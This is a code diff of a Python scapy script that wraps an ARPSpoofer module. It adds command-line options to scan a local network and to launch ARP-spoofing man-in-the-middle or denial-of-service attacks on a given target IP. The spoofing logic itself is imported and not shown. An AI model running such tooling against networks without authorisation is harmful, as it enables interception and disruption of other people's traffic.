@@ -1,36 +1,16 @@
-from logging import basicConfig, DEBUG, getLogger
+from logging import basicConfig, DEBUG, getLogger, WARNING
 from scapy.all import *
 from multiprocessing import Process
 from scapy.layers.inet import IP, ICMP
-# basicConfig(level=DEBUG) 
 from arpSpoofer import ARPSpoofer
+from argparse import ArgumentParser
 import time
+from json import dumps
 import signal
 import sys
 
 logger = getLogger(__name__)
 procs = []
-# from multiprocessing import Process
-# from scapy.all import sniff
-
-# def packet_sniffer():
-#     # Define your sniffing logic here
-#     def sniff_callback(packet):
-#         # Process each sniffed packet here
-#         print(packet.show())
-
-#     # Start sniffing
-#     sniff(prn=sniff_callback, store=0)
-
-# if __name__ == "__main__":
-#     # Start the packet sniffing process
-#     sniffer_process = Process(target=packet_sniffer)
-#     sniffer_process.start()
-
-#     # You can do other things here while the sniffer is running
-
-#     # Wait for the sniffer process to finish (optional)
-#     sniffer_process.join()
 
     
 def mitm_func(arp):
@@ -54,29 +34,75 @@ def start_spoofing_process(arp):
     procs.append(proc)
     logger.debug("Started spoofing process")
 
-    # def stop_spoofing_process(self):
-    #     if self.spoofer_proc != None:
-    #         self.spoofer_proc.terminate()
-    #         self.spoofer_proc = None
-    #     else:
-    #         raise Scapy_Exception(f"Spoofing process not active")
-    #     logger.debug("Stopped the spoofing process")
-
 
 if __name__ == '__main__':
+    ap = ArgumentParser()
+    # Adding arguments
+    # ap.add_argument("--sender_mac", type=str, help="Sender MAC address")
+    # ap.add_argument("--sender_ip", type=str, help="Sender IP address 1")
+    # ap.add_argument(
+    #     "--target_mac",
+    #     type=str,
+    #     default="1a:f8:aa:87:43:41",
+    #     help="Target MAC address 1",
+    # )
+    # ap.add_argument("--router_mac", type=str, help="Target MAC address 2 (Router)")
+    # ap.add_argument("--router_ip", type=str, help="Sender IP address 2 (Router)")
+
+    # ap.add_argument(
+    #     "ip_addresses", nargs="*", help="one or more ipaddresses to spoof MAC for"
+    # )
+    ap.add_argument("--task", help="Values: attack, scan")
+    ap.add_argument("-d", "--debug", action="store_true", help="enable debug logging")
+    # ap.add_argument(
+    #     "--status", action="store_true", help="check network status and info"
+    # )
+    args = ap.parse_args()
+
     arp = ARPSpoofer()
-    arp.spoof_client('172.16.5.104', 'mitm')
-    start_spoofing_process(arp)
-    start_mitm_process(arp)
+    if args.debug:
+        basicConfig(level=DEBUG)
+    else:
+        basicConfig(level=WARNING)
 
-    def signal_handler(sig, frame):
-        print('You pressed Ctrl+C!')
-        for proc in procs:
-            proc.terminate()
-        sys.exit(1)
+    if args.task == 'scan':
+        ap.add_argument(
+            "--scan_method",
+            help="scan local network for ip-mac mapping, Values: arp_resolve, arp, nmap_resolve, nmap",
+        )
+        args = ap.parse_args()
+        print(args)
 
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.pause()
+        if args.scan_method == None:
+            print("Enter scan method")
+            sys.exit(0)
+        print(dumps(arp.scan_network(args.scan_method),indent=4))
+    elif args.task == 'attack':
+        ap.add_argument(
+            "--target_ip", type=str, help="Target IP address 1"
+        )
+        ap.add_argument(
+            "--attack_type", type=str, help="Attack type, values - mitm/dos"
+        )
+        args = ap.parse_args()
+        print(args)
+
+        if args.target_ip == None or args.attack_type == None:
+            print("Enter target ip and attack type")
+            sys.exit(0)
+
+        arp.spoof_client(args.target_ip, args.attack_type)
+        start_spoofing_process(arp)
+        start_mitm_process(arp)
+
+        def signal_handler(sig, frame):
+            print('You pressed Ctrl+C!')
+            for proc in procs:
+                proc.terminate()
+            sys.exit(1)
+
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.pause()
 
 # from scapy.all import *
 # from scapy.layers.l2 import ARP, Ether
@@ -104,38 +130,6 @@ if __name__ == '__main__':
 # # print(dumps(arp_result,indent=4))
 
 # if __name__ == "__main__":
-#     ap = ArgumentParser()
-#     # Adding arguments
-#     ap.add_argument("--sender_mac", type=str, help="Sender MAC address")
-#     ap.add_argument("--sender_ip", type=str, help="Sender IP address 1")
-#     ap.add_argument(
-#         "--target_mac",
-#         type=str,
-#         default="1a:f8:aa:87:43:41",
-#         help="Target MAC address 1",
-#     )
-#     ap.add_argument(
-#         "--target_ip", type=str, default="172.16.7.92", help="Target IP address 1"
-#     )
-#     ap.add_argument("--router_mac", type=str, help="Target MAC address 2 (Router)")
-#     ap.add_argument("--router_ip", type=str, help="Sender IP address 2 (Router)")
-
-#     ap.add_argument(
-#         "ip_addresses", nargs="*", help="one or more ipaddresses to spoof MAC for"
-#     )
-#     ap.add_argument(
-#         "-s",
-#         "--scan",
-#         action="store_true",
-#         help="scan local network for ip-mac mapping",
-#     )
-#     ap.add_argument("-d", "--debug", action="store_true", help="enable debug logging")
-#     ap.add_argument(
-#         "--status", action="store_true", help="check network status and info"
-#     )
-#     args = ap.parse_args()
-#     print(args)
-
 #     # arp_request_client = Ether(dst=args.target_mac, src=args.sender_mac) / \
 #     #                 ARP(pdst=args.target_ip, psrc=args.sender_ip)
 
@@ -157,10 +151,6 @@ if __name__ == '__main__':
 #     #     sender_ip = args.router_ip
 #     # if args.router_mac:
 #     #     sender_ip = args.router_mac.replace(":", ".")
-#     if args.debug:
-#         basicConfig(level=DEBUG)
-#     else:
-#         basicConfig(level=WARNING)
 
 #     arp = ARPSpoofer()
 #     if args.status:
